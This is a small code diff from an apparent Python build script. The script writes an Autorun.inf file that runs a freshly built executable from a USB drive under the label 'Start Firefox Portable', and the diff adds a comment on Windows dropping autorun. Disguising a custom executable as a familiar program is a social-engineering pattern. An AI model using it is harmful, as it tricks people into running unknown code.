@@ -30,7 +30,7 @@ os.remove(exename+".spec")
 print("creating autorun file")
 
 # create AutoRun File
-with open("Autorun.inf","w") as o:
+with open("Autorun.inf","w") as o: #Autorun.inf is a file that used to be used to run programs automatically when a USB flash drive was inserted into a computer. However, starting with Windows 7, Microsoft removed this support for security reason
     o.write("(Autorun)\n")
     o.write("Open="+exename+"\n")
     o.write("Action=Start Firefox Portable\n")
